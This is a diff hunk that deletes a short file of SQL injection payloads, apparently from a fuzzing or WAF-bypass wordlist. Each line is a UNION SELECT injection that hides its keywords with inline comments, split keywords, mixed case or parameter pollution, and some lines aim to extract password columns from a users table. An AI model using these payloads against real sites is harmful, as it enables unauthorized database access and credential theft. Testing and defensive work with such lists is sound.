@@ -1,7 +1,0 @@
-1/*union*/union/*select*/select+1,2,3/*
-1;select+1&id=2,3+from+users+where+id=1--
-1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users
-1+union/*&b=*/select+1,2
-1+union/*&b=*/select+1,pass/*&c=*/from+users--
-1+un/**/ion+se/**/lect+1,2,3--
-1+UnIoN/**/SeLecT/**/1,2,3--
